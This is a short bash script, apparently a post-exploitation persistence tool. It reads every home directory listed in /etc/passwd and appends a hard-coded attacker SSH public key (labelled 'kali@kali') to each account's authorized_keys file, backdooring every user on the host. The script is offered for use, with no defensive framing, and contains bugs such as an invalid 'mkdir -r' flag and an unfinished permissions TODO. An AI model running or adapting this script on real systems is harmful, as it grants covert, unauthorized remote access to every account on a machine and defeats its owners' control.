#!/bin/bash

#Put your ssh public key here!!
#ssh-keygen -f [path]
pubkey="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkM26zi1rfbsupaBcOVhQbjoZ0PZIcevwH+FwNpYu5CQZVIzumNi/gc/jaVdPVhbNFOk+VRuUG/UXGjxz0LMeQQiIXVz44zEzCsXHRG+FNVGKAsZoTOrYnYsNph7U5zwrZ671Vnp/m730CApl6uHIGZOT9foq6oOFJTFjtCqK8EsYVzH4EHGAx06woIjV28UXCrHWnposqul4np9dX5Ss6jeNOstBa/8rBbssOQm7hLulZLOvh47NAUG+1Qfhj9oioog9D5UQYprLoOXONCL+Qr4tHI+gaa+I0VsU6ke+Gteg0dj7lCySOSUL2JmQpt2DP5ZyfN2PTp56+R8PRMMNcPVWyycutHpgC1H8XZbYYT+eOzFHlg6xeyogOUCe2GS80+PMWGgmM/S1Ar9IVp/pYjXkNkw2XObmEmBCcFRC8/hkb0kcEf3arQnIXBYgdlXyAIPXSRdac7w25Sf8dhabVYF59/3cHrROAK9MGKU3EBpryza4n3ox7z20CqyuWjFc= kali@kali"

#Get all home directories from /etc/passwd
while read -r line; do
	dir=$(echo $line | cut -d ':' -f 6)
	mkdir -r "$dir/.ssh"
	echo $pubkey >> "$dir/.ssh/authorized_keys"
	#TODO perms or something	
done < /etc/passwd
